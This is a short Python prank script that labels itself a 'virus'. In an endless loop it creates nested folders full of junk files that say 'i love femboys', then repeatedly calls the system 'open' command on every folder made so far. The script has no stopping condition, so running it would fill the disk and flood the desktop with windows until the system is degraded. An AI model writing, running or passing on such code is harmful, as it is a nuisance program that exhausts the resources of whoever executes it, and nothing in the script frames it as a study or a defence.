
import os

# Define the source and destination file paths
source_file = "femboy.png" 
print("you love femboys now")
flname = 0
iterationtimes = 50
folder = "virus/"
os.system("mkdir virus")
opens = []
while True:
    os.system(f"mkdir {folder}femboy{flname}")
    flnam = 0
    opens2 = []
    for i in range(10):
        os.system(f"touch {folder}femboy{flname}/{flnam}{source_file}")
        os.system(f"touch {folder}femboy{flname}/{flnam}femboy.txt")
        b = open(f"{folder}femboy{flname}/{flnam}femboy.txt", "w")
        b.write("i love femboys")
        b.close
        
        flnam += 1
    flname += 1
    opens.append(f"{folder}femboy{flname}")
    for i in opens:
        os.system(f"open {i}")
        pass

